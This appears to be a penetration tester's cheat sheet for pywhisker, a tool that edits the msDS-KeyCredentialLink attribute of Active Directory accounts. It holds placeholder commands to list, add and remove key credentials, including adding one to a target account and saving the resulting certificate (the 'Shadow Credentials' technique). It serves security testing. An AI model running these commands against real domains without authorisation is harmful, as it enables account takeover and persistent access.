### Source
https://github.com/ShutdownRepo/pywhisker

### Troubleshooting
```
[!] unsupported hash type MD4

pip3 uninstall cryptography
pip3 install pycryptodome
pip3 install cryptography
```

### List entries of msDS-KeyCredentialLink attribute
```
python3 pywhisker.py -d "<domain>" -u "<user>" -p "<password>" --target "<targetAccount>" -td <targetDomain> --dc-ip <domainController> --action "list"
```

### Add credential to the target object and write resulting certificate to file
```
python3 pywhisker.py -d "<domain>" -u "<user>" -p "<password>" --target "<targetAccount>" --action "add" --filename <outFile>
```

### Remove key credential by a DeviceID GUID
```
python3 pywhisker.py -d "<domain>" -u "<user>" -p "<password>" --target "<targetAccount>" --action "remove" --device-id <id>
```

